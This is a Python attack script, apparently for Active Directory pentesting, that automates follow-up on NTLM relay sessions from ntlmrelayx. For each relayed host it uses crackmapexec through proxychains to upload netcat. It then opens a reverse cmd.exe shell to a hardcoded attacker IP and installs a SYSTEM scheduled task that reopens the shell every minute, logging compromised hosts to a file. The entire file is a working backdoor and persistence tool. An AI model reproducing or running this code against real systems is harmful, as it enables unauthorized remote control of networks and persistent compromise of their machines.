import requests
import os
import time

LOCAL_IP = "192.168.0.9"
RUTA_LOCAL_NETCAT_EXE = "./nc.exe"

CARPETA_OBJETIVO =  "autoRelay"

# Define una clase llamada 'targetRelay' con un constructor 
class targetRelay:
    def __init__(self, ip, user_domain, port):
        self.ip = ip
        self.port = 4000 + port

        #Separamos el dominio del usuario 
        parts = user_domain.split('/')
        domain = parts[0]
        user = parts[1] 

        self.user = user
        self.domain = domain
        self.connection = f"proxychains crackmapexec smb {self.ip} -d '{self.domain}' -u '{self.user}' -p 'autorelay' "

    def create_dir(self):
        comandos = [         
                    f"{self.connection} -x 'mkdir C:\\Windows\\{CARPETA_OBJETIVO}'",
        ]
        
        for comando in comandos:
            p = os.popen(comando)

            time.sleep(4)
            if p.closed == True:
                p.close()
        
        print(f"directorio creado {self.ip}")


    #Ejecuta comandos en el objetivo con la intención de crear un backdoor
    def command_backdoor_netcat(self):
        comandos = [         
                    f"{self.connection} --put-file {RUTA_LOCAL_NETCAT_EXE} \\\\Windows\\\\{CARPETA_OBJETIVO}\\\\nc.exe",
                    f"{self.connection} -x 'C:\\Windows\\{CARPETA_OBJETIVO}\\nc.exe -e C:\\Windows\\System32\\cmd.exe {LOCAL_IP} {self.port}'" 
        ]
        
        for comando in comandos:
            p = os.popen(comando)

            time.sleep(4)
            if p.closed == True:
                p.close()
        
        print(f"puerta trasera establecida {self.ip}")

    def schd_task(self):
        comandos = [         
                    f"{self.connection} -x "  + "'" + 'schtasks /create /sc minute /mo 1 /tn "AutoRelay2" /tr "cmd.exe /C C:\\Windows\\' + CARPETA_OBJETIVO + '\\nc.exe -e C:\Windows\System32\cmd.exe ' + f"{LOCAL_IP} {self.port}" + '" /ru SYSTEM /f'+ "'",
                    f"{self.connection} -x "  + "'" + 'schtasks /run /tn "AutoRelay2"' + "'",
        ]
        # Abrir el archivo en modo de adjuntar ('a' significa append)
        with open('pwnd.txt', 'a') as archivo:
            # Escribir contenido adicional en el archivo
            archivo.write(f"{self.ip}  {self.port}\n")



        for comando in comandos:
            p = os.popen(comando)

            time.sleep(4)
            if p.closed == True:
                p.close()

        print(f"tarea programada realizada {self.ip}")

    


    def __str__(self):
        return f"{self.user}   {self.port}"


# Define la URL a la que se realizará la solicitud GET.
url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"


    


target_json = ""
i = 0 

# Comprueba si el código de estado de la respuesta es igual a 200 (éxito).

targets_pwnd = []

with open('pwnd.txt', 'a') as archivo:
    # Escribir contenido adicional en el archivo
    archivo.write("---------------------------------------------\n")

while True:
    try:
        # Realiza una solicitud GET a la URL especificada.
        response = requests.get(url)
    except requests.exceptions.ConnectionError as e:
        print(f"Error de conexión: {e}")

    try:
        if response.status_code == 200:
            print(response.json())

            data = response.json()

               
            for item in data:

                if item[1] not in targets_pwnd:
                    if item[3] == "TRUE"  : 

                            if item[1] not in targets_pwnd:
                                targets_pwnd.append(item[1])
                            
                            i += 1

                            target_json = targetRelay(item[1], item[2], i)
                            
                            target_json.create_dir()
                            target_json.command_backdoor_netcat()
                            target_json.schd_task()
                    
                else:
                    print("el servidor ya fue comprometido")
                                                 
                        

        else:
            # Si el código de estado no es 200, imprime un mensaje de error que incluye el código de estado.
            print(f"Error al obtener la página. Código de estado: {response.status_code}")

        
    except NameError as e:
        print(f"ERROR {e}")
    except ValueError as e:
            print(e)


    time.sleep(5)




